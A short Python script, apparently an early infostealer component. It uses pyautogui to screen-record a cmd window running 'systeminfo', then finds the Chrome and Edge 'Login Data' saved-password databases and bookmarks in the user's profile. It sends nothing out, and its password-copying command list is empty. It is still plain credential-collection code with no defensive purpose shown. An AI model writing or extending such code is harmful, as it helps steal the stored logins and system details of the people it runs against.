import pyautogui
import time

import glob
import os

commands = {
    "screen_rec": [
        ("win", "alt", "r"),
        ("wait", 3),
        ("win", "r"),
        ("wait", 1),
        ("type", "cmd"),
        ("enter", ),
        ("wait", 1),
        ("type", "systeminfo"),
        ("enter", ),
        ("wait", 5),
        ("ctrl", "shift", "pgup"),
        ("wait", 2),
        ("ctrl", "shift", "pgup"),
        ("wait", 2),
        ("win", "alt", "r"),
        ("wait", 2),
    ],
    "copy_pass": [],
}
home = os.path.expanduser("~")

def screen_rec(command_list):
    for command in command_list:
        action = command[0]
        if action == "wait":
            time.sleep(command[1])
        elif action == "type":
            pyautogui.write(command[1])
        elif action == "enter":
            pyautogui.press('enter')
        else:
            pyautogui.hotkey(*command)

    captures_folder = os.path.join(home, "Videos", "Captures")
    files = glob.glob(os.path.join(captures_folder, "*"))
    files.sort(key=os.path.getmtime, reverse=True)
    latest_file = files[0] if files else None
    return latest_file

def copy_password(command_list):
    # Define Chrome and Edge profile paths
    chrome_folder = os.path.join(home, "AppData", "Local", "Google", "Chrome", "User Data", "Default")
    edge_folder = os.path.join(home, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default")

    files_to_check = ["Login Data", "Bookmarks"]
    found_files = []

    # Check both folders
    for folder in [chrome_folder, edge_folder]:
        for filename in files_to_check:
            full_path = os.path.join(folder, filename)
            if os.path.exists(full_path):
                found_files.append(full_path)

    return found_files


def main():
    screen_path = screen_rec(commands["screen_rec"])
    pass_path = copy_password(commands["copy_pass"])
    return screen_path, pass_path
    
if __name__ == "__main__":
    main()